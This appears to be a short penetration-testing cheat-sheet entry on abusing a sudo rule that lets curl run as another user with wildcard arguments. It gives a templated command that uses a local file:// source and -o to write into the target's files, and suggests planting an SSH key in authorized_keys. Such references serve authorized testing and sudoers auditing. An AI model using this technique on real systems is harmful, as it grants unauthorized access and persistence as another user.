# sudo curl Wildcard Arbitrary File Write

If sudo lets you run `curl` as another user with arbitrary/wildcard arguments, abuse `-o` plus a local `file://` source to write content you control into a path the target user owns.

```bash
sudo -u <target> curl <decoy-url> -o <junk-file> file:///path/to/your/payload -o <target-controlled-path>
# e.g. write your own SSH pubkey into their authorized_keys
```

Same idea applies to any sudo-permitted binary that takes a user-controlled output path — not curl-specific.
